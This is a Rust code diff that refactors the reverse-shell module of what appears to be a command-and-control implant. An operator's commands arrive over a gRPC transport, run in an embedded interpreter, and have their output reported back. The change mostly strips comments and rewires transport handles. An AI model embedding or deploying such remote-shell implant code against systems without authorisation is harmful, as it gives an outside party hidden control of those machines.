@@ -1,7 +1,6 @@
 use anyhow::Result;
 use crossterm::{QueueableCommand, cursor, terminal};
 use eldritch_core::Value;
-use eldritch_libagent::agent::Agent;
 use eldritch_repl::{Repl, ReplAction};
 use eldritchv2::{Interpreter, Printer, Span};
 use pb::c2::{
@@ -22,14 +21,12 @@ pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
     mut transport: T,
     agent: ImixAgent<T>,
 ) -> Result<()> {
-    // Channels to manage gRPC stream
     let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
     let (input_tx, input_rx) = tokio::sync::mpsc::channel(1);
 
     #[cfg(debug_assertions)]
     log::info!("starting repl_reverse_shell (task_id={task_id})");
 
-    // Initial Registration
     if let Err(_err) = output_tx
         .send(ReverseShellRequest {
             task_id,
@@ -42,10 +39,8 @@ pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
         log::error!("failed to send initial registration message: {_err}");
     }
 
-    // Initiate gRPC stream
     transport.reverse_shell(output_rx, input_tx).await?;
 
-    // Move logic to blocking thread
     run_repl_loop(task_id, input_rx, output_tx, agent).await;
     Ok(())
 }
@@ -63,10 +58,19 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
             agent: agent.clone(),
         });
 
-        let mut interpreter =
-            Interpreter::new_with_printer(printer)
-                .with_default_libs()
-                .with_task_context::<crate::assets::Asset>(Arc::new(agent), task_id, Vec::new());
+        let sync_transport = agent.get_sync_transport();
+        let repl_handler: Option<Arc<dyn eldritchv2::pivot::ReplHandler>> =
+            Some(Arc::new(agent.clone()));
+
+        let mut interpreter = Interpreter::new_with_printer(printer)
+            .with_default_libs()
+            .with_task_context::<crate::assets::Asset>(
+            Arc::new(agent.clone()),
+            sync_transport,
+            repl_handler,
+            task_id,
+            Vec::new(),
+        );
         let mut repl = Repl::new();
         let stdout = VtWriter {
             tx: output_tx.clone(),
@@ -76,7 +80,6 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
 
         let _ = render(&mut stdout, &repl, None);
 
-        // State machine for VT100 parsing
         let mut parser = InputParser::new();
         let mut previous_buffer = String::new();
 
@@ -93,7 +96,6 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
                 continue;
             }
 
-            // Parse input
             let inputs = parser.parse(&msg.data);
             let mut pending_render = false;
 
@@ -106,11 +108,8 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
                         pending_render = true;
                     }
                     other => {
-                        // If we have a pending render from previous inputs, do it now
-                        // before processing a non-render action (like Submit) which relies on visual state.
                         if pending_render {
                             let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
-                            // Update previous_buffer after render
                             previous_buffer = repl.get_render_state().buffer;
                             pending_render = false;
                         }
@@ -118,11 +117,9 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
                         match other {
                             ReplAction::Quit => return,
                             ReplAction::Submit { code, .. } => {
-                                // Move to next line
                                 let _ = stdout.write_all(b"\r\n");
                                 let _ = stdout.flush();
 
-                                // Execute
                                 match interpreter.interpret(&code) {
                                     Ok(v) => {
                                         if !matches!(v, Value::None) {
@@ -138,12 +135,12 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
                                     }
                                 }
                                 let _ = render(&mut stdout, &repl, None);
-                                previous_buffer.clear(); // Reset after submit
+                                previous_buffer.clear();
                             }
                             ReplAction::AcceptLine { .. } => {
                                 let _ = stdout.write_all(b"\r\n");
                                 let _ = render(&mut stdout, &repl, None);
-                                previous_buffer.clear(); // Buffer is cleared in repl too
+                                previous_buffer.clear();
                             }
                             ReplAction::ClearScreen => {
                                 let _ = stdout.queue(terminal::Clear(terminal::ClearType::All));
@@ -165,7 +162,6 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
                     }
                 }
 
-                // If this is the last input and we have a pending render, flush it.
                 if i == inputs.len() - 1 && pending_render {
                     let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
                     previous_buffer = repl.get_render_state().buffer;
@@ -193,7 +189,6 @@ impl<T: Transport + Send + Sync> fmt::Debug for ShellPrinter<T> {
 
 impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
     fn print_out(&self, _span: &Span, s: &str) {
-        // Send to REPL
         let s_crlf = s.replace('\n', "\r\n");
         let display_s = format!("{s_crlf}\r\n");
         let _ = self.tx.blocking_send(ReverseShellRequest {
@@ -202,7 +197,6 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
             task_id: self.task_id,
         });
 
-        // Report Task Output
         let req = ReportTaskOutputRequest {
             output: Some(TaskOutput {
                 id: self.task_id,
@@ -212,7 +206,7 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
                 exec_finished_at: None,
             }),
         };
-        let _ = self.agent.report_task_output(req);
+        let _ = self.agent.get_sync_transport().report_task_output(req);
     }
 
     fn print_err(&self, _span: &Span, s: &str) {
@@ -235,6 +229,6 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
                 exec_finished_at: None,
             }),
         };
-        let _ = self.agent.report_task_output(req);
+        let _ = self.agent.get_sync_transport().report_task_output(req);
     }
 }
